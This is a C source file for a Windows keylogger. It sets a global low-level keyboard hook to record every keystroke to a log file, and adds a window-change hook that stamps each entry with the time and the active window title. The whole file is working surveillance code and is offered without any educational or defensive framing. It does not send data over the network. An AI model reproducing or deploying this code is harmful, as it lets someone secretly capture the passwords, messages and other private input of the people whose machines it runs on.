#include "keylogger.h"

// https://social.msdn.microsoft.com/Forums/sqlserver/en-US/fd2dacc1-64c0-4e59-99fd-db23f0a39ba8/error-lnk2019?forum=vclanguage
#pragma comment(lib, "user32.lib")

HHOOK			key_hook;
HWINEVENTHOOK	win_hook;

void	handle_sig(int sig)
{
	(void)sig;
	UnhookWindowsHookEx(key_hook);
	UnhookWinEvent(win_hook);
}

LRESULT CALLBACK	LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT	key = (PKBDLLHOOKSTRUCT)lParam;
	static char			shift = 0;
	FILE				*log;

	if (nCode == HC_ACTION)
	{
		if (wParam == WM_KEYUP)
		{
			if (key->vkCode == VK_LSHIFT || key->vkCode == VK_RSHIFT)
				shift = 0;
		}
		if (wParam == WM_KEYDOWN)
		{
			if (key->vkCode == VK_LSHIFT || key->vkCode == VK_RSHIFT)
				shift = 1;
			fopen_s(&log, LOGNAME, "a");
			fprintf_s(log, "%s", keys[shift][key->vkCode]);
			fclose(log);
		}
	}
	return (CallNextHookEx(key_hook, nCode, wParam, lParam));
}

void CALLBACK	Wineventproc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd,
	LONG idObject, LONG idChild, DWORD idEventThread, DWORD dwmsEventTime)
{
	SYSTEMTIME	time;
	int			len;
	char		*title;
	FILE		*log;

	(void)hWinEventHook;
	(void)idObject;
	(void)idChild;
	(void)idEventThread;
	(void)dwmsEventTime;
	if (event != EVENT_SYSTEM_FOREGROUND)
		return ;
	len = GetWindowTextLength(hwnd) + 1;
	title = LocalAlloc(LMEM_ZEROINIT, len);
	if (!title)
		return ;
	GetSystemTime(&time);
	GetWindowText(hwnd, title, len);
	if (!title)
		return ;
	fopen_s(&log, LOGNAME, "a");
	fprintf_s(log, "\n[%02d.%02d.%d %02d:%02d:%02d] - %s\n", time.wDay,
		time.wMonth, time.wYear, time.wHour, time.wMinute, time.wSecond, title);
	fclose(log);
	LocalFree(title);
}

int	main(void)
{
	MSG		msg;

	signal(SIGINT, handle_sig);
	key_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
	win_hook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, 0,
		Wineventproc, 0, 0, WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
	while (GetMessage(&msg, 0, 0, 0));
	return (0);
}
